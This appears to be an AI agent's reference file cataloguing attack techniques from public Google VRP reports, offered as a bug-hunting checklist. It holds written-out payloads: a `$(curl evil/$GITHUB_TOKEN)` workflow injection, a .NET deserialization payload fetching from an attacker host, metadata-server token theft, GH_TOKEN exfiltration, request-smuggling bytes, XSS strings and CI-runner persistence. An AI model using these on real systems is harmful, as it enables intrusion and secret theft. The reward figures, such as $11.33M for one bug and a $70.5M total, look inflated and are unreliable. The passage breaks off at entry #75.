@@ -1,0 +1,693 @@
+---
+name: Google VRP Public Hall-of-Fame Skills
+description: Skills, techniques and bug-class catalog distilled from 201 public Google VRP / Cloud VRP / OSS VRP reports (2018–2026). Independent from omespino's personal report dataset (reference_bughunters_skills.md). Every report is ingested with target, vulnerability class and key technique.
+type: reference
+---
+
+# Google VRP Public Hall-of-Fame — Skills & Techniques
+
+Distilled from 201 public reports rewarded under Google VRP, Cloud VRP, OSS VRP and Mobile VRP. Source: bughunters.json (Hall-of-Fame export). Total awarded across this dataset: **$70,565,520** (max single reward $11.33M for a Linux kernel exploit).
+
+This file is independent from `reference_bughunters_skills.md`, which covers omespino's personal Google VRP reports.
+
+---
+
+## Top recurring patterns (use as a hunting checklist)
+
+1. **GCP load balancer / CDN HTTP parser quirks** — bare CR after method, extra spaces after URI, non-ASCII chars in header names (\xa0, \x85), bare CR in chunk-ext BWS. Combine with quirky origin servers (Lighttpd, Tornado, FastHTTP, Node.js, Gunicorn<22) for cache poisoning or Cloud Armor bypass via request smuggling.
+2. **GitHub Actions "pwn request"** — `pull_request_target` + checkout of fork SHA without `persist-credentials: false` + non-ephemeral self-hosted runners. Auto-label bots can be used to trigger label-gated workflows. Inject through pom.xml (Maven exec plugin), `MESSAGE` env interpolation, composite action inputs (`issue-title`, `issue-body`, `main_repo`).
+3. **postMessage targetOrigin bypass** — `endsWith()` on origin allows `https://attacker.com/codeassist.google.com`. Always parse to URL and compare the `hostname`.
+4. **Open Code-OSS / Theia / IDX** — `webWorkerExtensionHostIframe.html` hosted on the same origin as the IDE. `parentOrigin` from query string + relayed `postMessage` → XSS → RCE. Also: filename injection in `launch.json`, debugger proxy that runs arbitrary JS, `_workstationAccessToken` Login-CSRF.
+5. **Closure Library `goog.loadModuleFromSource_`** in uncompiled mode — leftover `eval()` based loader on production studio.youtube.com gives same-origin RCE bypassing CSP / Trusted Types.
+6. **GCS bucket squatting** — services that auto-create deterministic buckets (`${project_id}-us-central1-adc`, `motus-pilot.appspot.com`, etc.) without verifying existence/ownership. Pre-claim → cross-tenant compromise & RCE via Terraform overwrite.
+7. **GKE Workload Identity downgrade** — relabel nodes to flip `iam.gke.io/gke-metadata-server-enabled=false` and `cloud.google.com/metadata-proxy-ready=true` to recover the host SA's `cloud-platform` access token.
+8. **Zip Slip → RCE** — extracting tar/zip without sanitizing entry names; overwrite a script the server later executes (e.g. `rasterize.js` consumed by phantomjs in SecOps SOAR; DLL hijack on Web Designer Windows).
+9. **GAR yum/dnf plugin URL validation** — `'pkg.dev' in url` and `'-yum.pkg.dev/' in baseurl` match `attacker.com/mirror?=test-yum.pkg.dev/`. Use `urlparse.netloc.endswith('.pkg.dev')` instead.
+10. **OAuth flow misconfigurations** — missing/empty `state`, `redirect_uri=http://localhost/_ah/login?continue=attacker.com` chained with App Engine local server's open redirect, `state.origin` injected into `endsWith()` allowlists.
+11. **Firebase / Firestore SDK secret leak** — `JSON.stringify` on Firestore objects exposes the private key inside `_settings`. Misspelled `toJson` vs `toJSON` lets `JSON.stringify` invoke the default serializer.
+12. **`api*` Firebase config public key** — used to call `identitytoolkit.googleapis.com/v1/accounts:signUp` to obtain an `idToken` (often `email_verified=false`) and bypass auth on management APIs.
+13. **Internal Google debug endpoints** — `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz`, `/java/procz`, `/java/labelaclz`. LFI as root, leak API keys, `gws-prod` bind, SA emails, BNS addresses. (Mostly omespino territory but two reports here too.)
+14. **AMP / preview / validator services** → SSRF to GCP metadata `169.254.169.254/?recursive=true&alt=text` with `Metadata-Flavor: Google`. Use redirect chain on attacker server when target blocks IPs.
+15. **Android intent redirects / browsable bypass** — Google App / Scene Viewer / Faceviewer / Firebase Dynamic Links forward `intent://` URIs without the `BROWSABLE` category, defeating Chromium's mitigations and choosing arbitrary browsers/apps.
+16. **Path traversal in Android app downloads / Drive / Gmail** — filename `../../../foo` accepted by Google Chats, Gmail. Combined with TCC entitlement inheritance on macOS Drive (child injection) for permission escalation.
+17. **Confused-deputy in Google Play Services** — `ACTION_PICK` with cross-user `content://10@media/external/images/media/<id>` URI; GMS reads with `INTERACT_ACROSS_USERS`.
+18. **Google Docs / Slides one-click hijacks** — YouTube embed `videoId=../signin?next=` to redirect onto docs.google.com → frame `docs.google.com/file/d/{ID}/edit?userstoinvite=attacker@x` → spoof the Send button with SVG/CSS filters; "Generate document" clickjacking with @-tagging.
+19. **YouTube channel/email deanonymisation via Content ID API** — `studio.youtube.com/.../get_creator_channels` with `includeSuspended:true` leaks `contentOwnerAssociation`; then `developers.google.com/youtube/partner/.../contentOwners.list` returns the channel's signup email.
+20. **VirusTotal session forgery** — base64 `username||timestamp||hash`; brute the 4–5 byte tail and re-create a user whose username matches the candidate to mint a valid signature.
+21. **Markdown link parsing inconsistencies** — Issue Tracker accepts `ftp://`, integer IPs (2130706433), `[text](ftp:%67%6f%6f%67%6c%65%2e%63%6f%6d@%65%76%69%6c%2e%63%6f%6d)`, `<ftp:/google.com@evil.com>`. Tab-nabbing on triagers.
+22. **Golang `net/html` parser discrepancies** — `<svg><style>/* &lt;/style> &lt;img onerror=` (style tag entity decoding), `<!--!>` empty-comment ambiguity, `html/template` not escaping backticks.
+23. **Apigee "policy boundary" bypasses** — share state across JavaScript / JavaCallout / PythonScript / LookupCache policies to escape Rhino ClassShutter; LookupCache `postDeserialize()` not sandboxed → Java RCE; header injection with `request.header.customHeader.1` (positional) bypasses the newline filter; Hosted Targets Node.js runs as root.
+24. **GitHub-token leak via `actions/checkout` default** — `find $HOME/work -type f -name config | xargs cat` extracts the token because credentials persist in local git config. Add `persist-credentials: false`.
+25. **Auto-label bots as triggers** — `auto-label` on PR title labels the PR → `pull_request_target: types: [labeled]` workflows fire on attacker code.
+26. **Closure of Python libraries with insecure defaults** — `imaplib.IMAP4_SSL` and `smtplib.SMTP.starttls` without an SSL context (Python ≥3.3) skip cert validation.
+27. **JWT / Firebase ID token without `email_verified`** — register `jdoe@google.com`, get `idToken`, hit management API. Default Firebase signUp endpoint is open by API key.
+28. **Composer / Airflow `secret_key`** hardcoded as `some-random-id`; Composer env vars (`PYTHONWARNINGS`, `BROWSER`) executed by Python on every spawn → reverse shells in dag processor / triggerer / worker / webserver.
+29. **CEF / debugger remote debugging port** left open on Electron-style apps (Web Designer, IDX) → connect locally for full file/SDK access.
+30. **Membership / "redacted" enumeration** — Google Groups search response contains `class="LnLepd"` only when the prefix matches, allowing per-character reconstruction of `us****@domain.com` redacted emails.
+
+---
+
+## Reward & status overview
+
+- 201 reports, all currently FIXED.
+- Programs in scope: Google VRP, Cloud VRP, OSS VRP, Mobile VRP.
+- 148/201 received a public reward; 53 are $0 (out-of-scope acquisitions, duplicates, won't-fix, or accepted-without-bounty).
+- Top 3 single rewards: $11,333,700 (Linux Kernel io_uring UAF), $3,183,700 (Cloud DM RCE), $3,133,700 (magic-modules CI access tokens).
+- 17 reports paid ≥ $1,000,000.
+- Most prolific bug classes: XSS (31), Auth Bypass / Permissions (27), RCE (11), Information disclosure (13), Path Traversal / Zip Slip (6), CSRF (5), IDOR (5), OAuth/SSO (4), HTTP/cache (4), GitHub Actions (3), Kernel (2), SQLi (2).
+
+---
+
+# Per-report skill catalog
+
+Format: `#N | $reward | author | program | target | type` followed by a one-paragraph technique summary.
+
+## Tier 1 — Million-dollar rewards
+
+### #1 — $11,333,700 — David Bouman — kernelCTF — Linux Kernel io_uring (CVE-2022-2602)
+UAF in `io_uring` registered files: `unix_scm_cycle_create` GC freed a fixed file still in use by a queued request. New cross-cache primitive: free the victim slab, then reallocate the same pages via `__get_free_pages` from `io_mem_alloc()` (rings/sqes are mmap-ed to userspace, so the freed object is *live* in user memory — no header pollution, no allocator races, no need to spray hundreds of slab objects). Drove an `IORING_OP_RECVMSG` side-channel through provided buffers to leak `socket_file_operations` byte-by-byte; used `IORING_OP_FADVISE → netdev_init` to leak the controlled buffer's address; then `__io_commit_cqring` (32-bit write) + `bsg_get_command_q` (32-bit read) gadgets to flip cred/nsproxy. Reliability ~80–90%.
+
+### #2 — $3,183,700 — Ezequiel Pereira — Cloud DM RCE
+Created a Type Provider in Deployment Manager pointing `descriptorUrl` at internal blade target with `inputMappings.value: $.googleOauth2AccessToken()` so the provider attaches a Google OAuth Bearer to every outbound request, returning the response in the operation `selfLink`. Use `gslbTarget=blade:apphosting-admin-nightly`, `credentialType:GAIAMINT`, `transport:GSLB`.
+
+### #3 — $3,133,700 — Divyanshu — OSS VRP — magic-modules CI access tokens
+Malicious PR against `GoogleCloudPlatform/magic-modules`; CI minted GCP access tokens written to a token file accessible from the workflow context. Tokens were valid across multiple internal CI projects (`ci-gke-*`, `ci-bq-*`, `ci-gsuite-sa-project` containing `gsuite-sa.json`, `graphite-docker-images`).
+
+### #4 — $2,250,000 — Sudhanshu Rajbhar — Google VRP — IDX/Code-OSS XSS → RCE
+`webWorkerExtensionHostIframe.html` is hosted on the same origin as the IDX workstation. The page reads `parentOrigin` from `searchParams` and forwards postMessages to the worker. Chain: attacker XSS on `*.cloudworkstations.googleusercontent.com` (uploaded `.ipynb` with HTML) → iframe victim's `*.idx.cloudworkstations.dev` (allowed by `frame-ancestors`) → Login-CSRF via `_workstationAccessToken` GET param → spoofed postMessages execute JS in worker → fetch `/etc/passwd` and impersonate gcloud auth.
+
+### #5 — $2,000,000 — Jakub Domeracki — Cloud VRP — Gemini Code Assist OAuth code theft via postMessage targetOrigin bypass
+`developerconnect.google.com/redirect` reads the `state.origin` JSON field and uses `endsWith()` against an allowlist (`codeassist.google.com`, etc.). `https://attacker.com/codeassist.google.com` satisfies `endsWith()`, so `window.opener.postMessage(window.location.toString(), origin)` ships the OAuth code to the attacker. Also opens the second-stage attack of swapping the code at `codeassist.google.com/api/finishoauth`. Fix: parse to URL, compare `hostname`.
+
+### #6 — $2,000,000 — brutecat — Google VRP — YouTube channel email disclosure
+`studio.youtube.com/youtubei/v1/creator/get_creator_channels` with `includeSuspended:true` leaks the channel's `contentOwnerAssociation.externalContentOwnerId` even without including it in the mask (mask ACL bypassed by `includeSuspended`). Then any account that was bound to a YPP channel can call `youtubepartner.contentOwners.list` (Try-it-Now API explorer still works) and receive `conflictNotificationEmail` for any contentOwnerId, deanonymising any monetised channel.
+
+### #7 — $2,000,000 — Dhaval Khamar — Google VRP — Sheets `pubhtml` `single=true→false` bypass
+Sheets published "to the web" with only one tab ignores the `single` parameter on the server side; flipping `&single=true` to `&single=false` reveals all tabs.
+
+### #8 — $1,600,000 — Jakub Domeracki — Cloud VRP — SecOps SOAR Zip Slip → RCE
+`Compressor.UnzipFilesToFolder()` uses `Path.Combine(directoryName, item2.Entry.Name)` with no traversal check. Use a malicious `usecase.zip` with an entry named `/opt/siemplify/siemplify_server/bin/ChartsJs/rasterize.js` (the phantomjs script later launched by `ChartRenderer`) → arbitrary RCE → exfiltrate K8s pod env, default SA token, and ultimately Cloud Secret Manager secrets including `FirebaseRemoteConfigServiceAccountProd` from `siem-firebase-prod`.
+
+### #9 — $1,500,000 — smaury — Google VRP — Gmail Layouts CSPT
+`https://mail.google.com/mail/?layoutid=$layoutId` builds `https://docs.google.com/email-layouts/d/$layoutId/export`. `layoutId` is concatenated unsanitized → `layoutid=aaaa/test/../../<targetId>` reaches arbitrary docs.google.com endpoints, embedding their HTML response into the Gmail draft body.
+
+### #10 — $1,500,000 — Abhishek Mathur — Google VRP — Apps Script `DocumentApp.openById()` editor disclosure
+Run `DocumentApp.openById('<docId>').getEditors()` from any Apps Script project — returns `getEmail()`, `getUsername()`, `getUserLoginId()` of all editors of any publicly-shared Doc, even when the UI hides them.
+
+### #11 — $1,500,000 — OSS VRP — CDAP/Data Fusion GitHub Actions pwn requests
+~22 repos in `data-integrations` and `cdapio` orgs use `workflow_run` triggered by a "Trigger build" workflow then `actions/checkout@v3` with `${{ github.event.workflow_run.head_sha }}`. Submit a draft PR with a workflow named `Trigger build`; the parent `build.yml` then builds untrusted Maven `pom.xml` (use `maven-exec-plugin` to run `bash` and exfiltrate `GH_TOKEN` from `.git/config`). Self-hosted `k8s-runner-build` non-ephemeral runners enable Runner-on-Runner persistence.
+
+### #12 — $1,433,700 — Michael Dalton — Google VRP — Real-time Support API PII leak
+`google.internal.realtimesupport.v2.ChangeService2.ListChanges` (POST `realtimesupport.clients6.google.com/v2/changes:list`) callable by any Google account. Returns agent names/emails (`@google.com`), activity status (`Lunch`, `Coaching`, `Twitter Support`), customer Google account names, support pools, `cbfConversationId`, and **unredacted customer phone numbers**. Authentication via `SAPISIDHASH` SHA-1 over `timestamp SAPISID origin`. ~30M phone numbers exposed.
+
+### #13 — $1,333,700 — Jakub Domeracki — Cloud VRP — ADC bucket squatting
+Application Design Center auto-creates `${project_id}-us-central1-adc` GCS bucket on first enable. No ownership check. Pre-claim the bucket, set `roles/storage.admin` for `allUsers`. When the victim enables ADC, the `service-${project_number}@gcp-sa-designcenter.iam.gserviceaccount.com` P4SA writes Terraform files (and other artifacts) into the attacker bucket → leak secrets, and overwrite IaC for downstream RCE.
+
+### #14 — $1,333,700 — OSS VRP — Bazel `cherry_picker` action injection
+`bazelbuild/continuous-integration/actions/cherry_picker/action.yml` interpolates `${{ inputs.issue-title }}` / `${{ inputs.issue-body }}` directly inside a `run:` block. Any GitHub user can open an issue with a title like `$(curl evil/$GITHUB_TOKEN)` to inject into composing workflows (bazel/bazel uses this composite action).
+
+### #15 — $1,333,700 — Praetorian — OSS VRP — TensorFlow self-hosted runner takeover
+Default GH setting: workflows from prior contributors do not require approval. Tensorflow had ARM64 non-ephemeral self-hosted runners (`runner6`, `runner7`, …). Submit a tiny merged PR to become a "contributor", then PR a workflow with `runs-on: [self-hosted, linux, ARM64]` that installs a private self-hosted runner via `nohup ./run.sh &` with `RUNNER_TRACKING_ID=0` to detach from the job — uses GitHub as C2, evades EDR/firewall, steals subsequent `GITHUB_TOKEN`s and secrets (`GCP_CREDS`, `AWS_PYPI_ACCOUNT_TOKEN`, `JENKINS_TOKEN`, `DOCKERHUB_TOKEN`).
+
+### #16 — $1,000,000 — madStacks — v8CTF — n-day v8 OOB write
+Reproduced from public regression test of v8 commit 10b0e62e. R/W/AOF primitives in v8 sandbox, leaked WebAssembly RWX page address from WasmInstance object, ROP via `mov` constant gadgets, copied final shellcode to RWX page.
+
+### #17 — $1,000,000 — AppSheet deserialization RCE
+Custom bot Webhook with body `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, …","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, …","$values":["cmd","/c powershell -command Invoke-WebRequest http://attacker"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, …"}}` — classic .NET JSON.NET TypeNameHandling RCE.
+
+### #18 — $813,370 — Rio Mulyadi Pulungan — Google VRP — XSS in `support.google.com/cloud/contact/prod_issue`
+Subject/Description/Affected-product fields stored XSS firing inside internal `sfstory.googleplex.com` and `unify.my.salesforce.com`.
+
+### #19 — $750,000 — Shaber Tseng — Google VRP — Web Designer Zip Slip (Windows)
+Custom-component `.zip` import path-traverses with `..\..\..\..\Temp\evil.txt`. Targets `C:\Windows\System32\` (DLL hijacking) and `…\Programs\Startup\` for persistence if user runs Web Designer as admin.
+
+### #20 — $750,000 — Abhishek Mathur — Google VRP — `SpreadsheetApp.openById().getFormUrl()` reveals linked Form
+Apps Script returns the Form URL of the source Form for any publicly-viewable spreadsheet, allowing attackers to submit fake responses and corrupt the data.
+
+### #21 — $750,000 — Amit Klein et al. — Fuchsia/gVisor PRNG seed leak
+Several network-stack secrets predictable from observed TCP ISN, TCP timestamp, source ports, IPv4/IPv6 fragment IDs. Discloses internal IP behind NAT, enables DNS cache poisoning, TCP blind reset, IPv4 ID hash collision attacks, device tracking across networks. Files cited in `gvisor.dev/gvisor/pkg/tcpip/` and `golang/go/src/math/rand/rng.go`.
+
+### #22 — $750,000 — Golang `net/html` style-tag entity decoding XSS
+`<svg><style>/* &lt;/style> &lt;img src=x onerror=alert(1)>` — net/html decodes `&lt;` inside `<style>`; if a sanitizer allows only `<h1>` etc. but the renderer keeps style content, the attribute survives and the `<img onerror>` fires.
+
+### #23 — $750,000 — NDevTK — `edit.chromium.org` access_token leak
+`?file=https%3A%2F%2Fandroid.googlesource.com%2Fexample.com%23.googlesource.com%2F…` bypasses the host allowlist and posts the OAuth token (`gerritcodereview`, `androidbuild.internal`, `userinfo.email`) to `https://example.com/?access_token=…`.
+
+### #24 — $750,000 — Sohom Datta — Golang `html/template` backtick XSS
+`html/template` does not escape backticks inside `<script>` template literals, so `Name = "X\`; eval(\`alert(1)\`); var t=\`"` breaks out of a template-literal context.
+
+### #25 — $633,700 — Ryan Kovatch — `director.youtube.com` arbitrary upload
+YouTube Video Builder POST `Image2VideoUiService/UploadToYouTube` accepts an attacker-supplied YouTube channel ID; uploads (unlisted) to anyone's channel without authorization.
+
+### #26 — $626,740 — Rio Mulyadi Pulungan — Blind XSS in `[appname].googleplex.com` admin dashboard
+Blind XSS landing in admin dashboard via name field; admin cookie / session hijack.
+
+### #27 — $600,000 — Ben Kallus — GCP Classic App LB request smuggling to Node.js
+`POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n38\r\n0\r\n\r\nGET /bad_path/ ...`. LB allows bare CR inside chunk-ext BWS; Node parses `\r\r` like `\r\n`. LB sees one POST + one GET to `/`, Node sees a smuggled GET `/bad_path/` → bypass Cloud Armor rules. Loop POC.
+
+### #28 — $500,000 — Jakub Domeracki — Cloud VRP — GKE WIF downgrade attack
+Cluster created with Workload Identity Federation still ships `metadata-proxy-v0.1` DaemonSet preinstalled. With `nodes patch` permission (`container.nodes.update` is in `Kubernetes Engine Developer`!): `kubectl label nodes $N iam.gke.io/gke-metadata-server-enabled=false --overwrite` and `kubectl label nodes $N cloud.google.com/metadata-proxy-ready=true` re-enables Metadata Concealment. Then `curl http://metadata.google.internal/.../token` with `Metadata-Flavor: Google` returns the **node SA** access token (often `cloud-platform`). Not exploitable on Autopilot (GKE Warden blocks).
+
+### #29 — $500,000 — Rebane — Google VRP — XS-Search on Google Drive via frame counting
+`drive.google.com/drive/search?q=…` loads different number of subframes when results match vs not; cross-origin frame counting leaks indexed document content keyword by keyword.
+
+### #30 — $500,000 — Ben Kallus — GCP Classic App LB header-name `\xa0` smuggling
+LB forwards non-ASCII bytes (0x80–0xff) inside header names; Gunicorn<22 stripped header names with `str.strip` (Unicode-aware) so `Transfer-Encoding\xa0:` is treated as `Transfer-Encoding:` → header smuggling → bypass Cloud Armor and poison CDN.
+
+### #31 — $500,000 — `xoogler-payday` GCS bucket
+`storage.googleapis.com/xoogler-payday/` listing is enumerable; password-protected zip files can be downloaded and brute-forced.
+
+### #32 — $500,000 — Kavindu Pasan — Cloud Cheatsheet XSS
+Drawing links sanitised on frontend only; calling Cloud Function `add_architecture` directly with `link: "javascript://%0aalert(document.domain)"` saves payload that runs on `googlecloudcheatsheet.withgoogle.com`.
+
+### #33 — $500,000 — Ben Kallus — GCP Classic App LB + CDN cache poisoning via bare CR after method
+LB forwards `GET\r /index.html HTTP/1.1`; Tornado/Lighttpd/CherryPy/libsoup/libevent treat `GET\r` as a distinct method (501) but CDN caches under key `/`. Subsequent legitimate `GET / HTTP/1.1` returns cached 501 → DoS.
+
+### #34 — $500,000 — Ben Kallus — Cloud CDN forwards bare CR in header values
+`Test-Header: X\rX\r\n\r\n` reaches origin unchanged, violating RFC 9112; usable for cache poisoning / ACL bypass with origin servers that misinterpret bare CR.
+
+### #35 — $500,000 — NDevTK — Tag Assistant Legacy SOP bypass
+On any site: `chrome.runtime.sendMessage({message:'LoadScript', url:'http://192.168.1.1'}, console.log)` — content script proxies arbitrary HTTP fetches and returns response; reads internal LAN pages.
+
+### #36 — $500,000 — partneradvantage.goog ContentDocument editing
+Salesforce-based site exposes `contentdocument/All`; any user can update or delete `flexipage-meta` XML files owned by Googlers. After `force:source:push` deploy, the prod site changes.
+
+### #37 — $500,000 — Google Public DNS DNSSEC cache pollution
+Modifying RRSIG with non-matching key tag returns insecure answer (without AD bit) instead of SERVFAIL — allows cache pollution of DNSSEC-signed domains.
+
+### #38 — $500,000 — smaury — Web Designer CEF Debugger Enabled
+Production builds shipped with `--remote-debugging-port` on a random local port; another local user can connect to `http://localhost:<port>` and call `https://ninja-shell/api/file?method=read&file=/etc/passwd` (and `create`, `delete`) → privilege escalation between local users; also steal Google OAuth refresh token if logged in.
+
+### #39 — $500,000 — Andre — Google Analytics 100M+ user demographic leak
+Use Analytics advanced filters (gender + age + interests) cross-joined with site-level user IDs to extract Google profile (gender / age / interests / affinity / in-market segments) for arbitrary visitors of any site running GA.
+
+### #40 — $500,000 — tyage — Angular Universal SSR SSRF
+`@nguniversal/*-engine` with `useAbsoluteUrl` resolves relative URLs using the request's `Host` header. `curl localhost:4000 -H "Host: 169.254.169.254"` makes the SSR fetch metadata server contents.
+
+### #41 — $500,000 — Richie Lee — Google Ads Bulk Actions IDOR
+`/aw_bulk/_/rpc/ScriptService/Preview` returns `execution_id` for `dashboard_id`+`script_id` of other users; chain with `ExecutionProgressService/GetIncrementalProgress` to read other users' Ads scripts.
+
+### #42 — $500,000 — Omar Espino — Google Cloud Shell instance takeover (root)
+Reference report. `<style onload>` XSS in .md preview → LFI `?uri=file://` → container escape `../id_cloudshell` → SSH as root to `devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev:6000`. Delivered through GitHub "Open in Cloud Shell" button.
+
+### #43 — $500,000 — wtm (offensi) — Cloud Shell `go_get_repo` RCE
+Undocumented GET param `?go_get_repo=go.offensi.com/go.html` invokes `go get` inside Cloud Shell; serve `<meta name="go-import" content="… hg https://attacker/hgrepo/root">` to load a Mercurial repo exploiting CVE-2019-3902, dropping a malicious `cut` binary later executed by `cloudshell_open`.
+
+### #44 — $500,000 — Jinseo Kim — Monorail / `bugs.chromium.org/prpc` OAuth without XSRF
+`monorail_servicer.py` allows Googler OAuth tokens without XSRF check; phish a Googler into authorising any OAuth Playground app with `email` scope to gain full Issue Tracker access as that Googler.
+
+### #45 — $500,000 — Jun Kokatsu — User-Agent Switcher extension UXSS
+Compromised renderer can `chrome.extension.sendRequest({action:"add_ua", user_agent:"X'+alert(origin)+'"})` to inject the UA into the content script's `Object.defineProperty` template, executing JS on every site that reads `navigator.userAgent`.
+
+### #46 — $500,000 — Maxime Escourbiac — Groups search reveals restricted messages
+Search at `groups.google.com/a/<domain>/forum/#!search/text` returns excerpts from non-public groups that the user cannot otherwise access.
+
+### #47 — $500,000 — Andrew Sirkin — Drive Form responses included in folder zip
+"Download all" of a shared folder zips the embedded Form's response CSV even for users with view-only access.
+
+### #48 — $500,000 — GCR delete via GKE node with read-only `devstorage` scope
+`gcloud container images delete` from a GKE pod whose node OAuth scope is `devstorage.read_only` succeeds because the GCR API path uses `projectEditor` legacy bucket binding that overrides the scope.
+
+### #49 — $500,000 — Engue Gillier — Gmail Hangouts iframe postMessage XSS
+`mail.google.com` iframes `hangouts.google.com/webchat/u/0/load` named `gtn-roster-iframe-id`. Gmail honours postMessage from any source telling it to iframe a URL — including `javascript:` — bypassing CSP only on Edge/IE11. Channel name is `Math.floor(2147483648 * Math.random()).toString(36)` — predictable.
+
+### #50 — $450,000 — Thrivikram Guruprasad — Mobile VRP — Google Chats Android path traversal
+Attachment filename `../../../PathTraversal/code.txt` writes outside of `/Download` to `/storage/emulated/0/PathTraversal`.
+
+### #51 — $450,000 — NDevTK — Google App Faceviewer trusts gstatic
+`<a href="faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://ssl.gstatic.com/<reflected-xss-on-gstatic>">` then `faceViewerWebXBridge.postMessage(JSON.stringify({cmd: btoa(':\x0f\n\rtestintent://')}))` invokes a non-browsable intent from the web.
+
+### #52 — $450,000 — NDevTK — Play Store `market://` intent bypass
+`market://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org` opens Samsung Browser to attacker URL without prompting, bypassing Chromium's other-browser launch dialog (issues.chromium.org/40060327).
+
+### #53 — $413,370 — Rebane — Google Docs/Slides one-click folder hijack
+Slides YouTube embed `videoId="../signin?...next=accounts.youtube.com/SetSID?continue=docs.google.com"` allows iframing arbitrary `docs.google.com` paths. Use `/file/d/{ID}/edit?userstoinvite=attacker@x` then spoof the `Send` button. `/a/example.org/file…` redirect normalisation lets the docs→docs check pass.
+
+### #54 — $313,370 — Search Console export "Continue" button bypass
+The gating "Continue" button is `disabled=""` only client-side; toggle it via DevTools to enable Bulk Data Export to attacker BigQuery project even with `Full` (not Owner) permission.
+
+### #55 — $313,370 — Rebane — Google Docs "Generate document" clickjacking
+SVG/CSS `feMorphology`+`feComposite` filters paint a fake newsletter signup over the real "Generate document" UI; victim types email and presses Enter, triggering `@gmail.com` document mention; the AI fetches one of the user's docs into a doc the attacker can read.
+
+### #56 — $313,370 — Jakub Domeracki — OSS VRP — `python-storage` bucket traversal
+`upload_chunks_concurrently()` formats `"{hostname}/{bucket}/{blob}".format(...)` without `_quote(blob.name)` so `blob.name = "../other-bucket/object"` writes cross-bucket.
+
+### #57 — $313,370 — NDevTK — IDX insecure debugger proxy
+`https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=` runs arbitrary JS and can register a service worker that captures `_workstation/login?redirect=<secret>` URL → use that secret to mint a `WorkstationJwt` cookie for any port subdomain.
+
+### #58 — $313,370 — NDevTK — Office Editing extension data leak
+Iframe `chrome-extension://gbkeegbaiigmenfmjfclcdgdpimamgkj/views/app.html?state={ids:[<docId>]}` and intercept inner-frame postMessages → leaks the Drive-hosted .docx/.pptx contents (no share required).
+
+### #59 — $313,370 — Khaled Elmasrey — Google Fiber `ubus` JSON-RPC unauth reboot
+`POST /ubus` with `{"method":"call","params":["00000000…","session","login",{"username":"","password":""}]}` returns a session, then `system reboot` reboots the router. Also bypassed with `assist` username on more locked-down hosts.
+
+### #60 — $313,370 — NDevTK — Google App fullscreen spoof via Scene Viewer / Faceviewer
+`faceviewer://` and `intent://arvr.google.com/scene-viewer/...` open in fullscreen without the warning toast — full address-bar spoof.
+
+### #61 — $313,370 — Mohamed Mahmoudi — GCP Backend Bucket misrouting
+Default GCP load balancer concatenates path before `/` with the bucket name (e.g. request `GET -pwn/index.html` to a LB whose bucket is `vellum-sc-backend-bucket-for-protection` is forwarded as `GET vellum-…-protection-pwn/index.html` to GCS). 5000+ instances vulnerable. Misroute to attacker-owned `<bucket>-pwn` for response forgery, reflect `x-goog-meta-*` headers, or pull large files from victim LB for billing DoS.
+
+### #62 — $313,370 — NDevTK — Application Launcher For Drive lax messaging
+`externally_connectable.matches: ["*://*.google.com/*"]` lets any google.com subdomain (including `http://`) post to extension; `chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh',{name:'com.google.drive.nativeproxy'})` opens shared `.vbs` files via native messaging on Windows → RCE.
+
+### #63 — $313,370 — Ryan Kovatch — `support.google.com/apis/caseslist` exposes internal case IDs
+`https://support.google.com/apis/caseslist` returns internal case IDs alongside customer ones; user can `POST conversations:updateChatTranscriptEmailState` for those internal cases and receive an email transcript of internal Google Support agent-to-agent chats.
+
+### #64 — $313,370 — Aditya Singh — Firebase console SSTI via Google name
+Set Google account name to `{{7*7}}` then visit `console.firebase.google.com/?utm_source=firebase.google.com&utm_medium=referral`; hovering profile photo evaluates the expression. (Reward suggests at least template injection client-side; full RCE not demonstrated.)
+
+### #65 — $313,370 — Grzegorz Niedziela — `net/html` empty-comment XSS
+`<!--!>` parsed differently by browsers (comment open) vs net/html (empty comment) — sanitiser believes `<a href="javascript:…">` is inside an attribute, but the browser sees a real anchor.
+
+### #66 — $313,370 — Vivek Muthuswamy — Google Chat IDOR remove members
+POST to `DynamiteWebUi/data/batchexecute?rpcids=itoCId` with attacker-controlled `space/AAAA…` and victim user ID removes any user including the Space Manager.
+
+### #67 — $313,370 — Jinseo Kim — Forms `maestro_new_project_uri` ID leak
+`viewform` page source contains `maestro_new_project_uri` whose redirect URL exposes the form's editable parent ID, letting any link recipient open `/forms/d/<id>/edit`.
+
+### #68 — $313,370 — Vinoth Kumar — `keep-pa.clients6.google.com/static/proxy.html` postMessage XSS
+Proxy iframe accepts postMessage `{s:"makeHttpRequests", a:[[{key:"gapiRequest", params:{url:"/", root:"keep-pa.clients6.google.com", authType:"1p"}}]]}` and replies with full Keep notes / email / OAuth on behalf of the logged-in user.
+
+### #69 — $313,370 — Jun Kokatsu — Google Translate extension UXSS
+Compromised renderer sets `chrome.storage.local.set({gtxTargetLang:"X'+alert(1)+'"})`; later code-injects into translated page.
+
+### #70 — $313,370 — Rio Mulyadi Pulungan — XSS in `informatica-prod.corp.goog`
+Internal corporate informatica dashboard with reflected XSS — admin session hijacking.
+
+### #71 — $313,370 — Loïck Jeanneret — Sheets data-validation XSS via IE/Edge
+`<img src=err onerror=alert(document.domain)>` as data-validation criteria fires on cells in IE11/Edge; clickjacking variant works in Chrome.
+
+### #72 — $313,370 — Jinseo Kim — Cloud Print scope reads pending docs
+`auth/cloudprint` token + `/cloudprint/jobs` returns pending document `fileUrl` even though scope description does not advertise content read.
+
+### #73 — $313,370 — Jinseo Kim — Kaggle Kernel metadata SSRF
+`curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token` from any Kaggle kernel returns token with broad scopes.
+
+### #74 — $313,370 — Jafar Abu Nada — `peering.google.com` LFI
+`/static/images/couch-ipad.png../../../../../../../etc/passwd` reads arbitrary files, leaks `apihost_address=169.254.169.253:4`, `server_software=Google App Engine/1.9.69`.
+
+### #75 — $313,370 — Sjoerd Bouber — Scholar `manage_labels` data: URL XSS
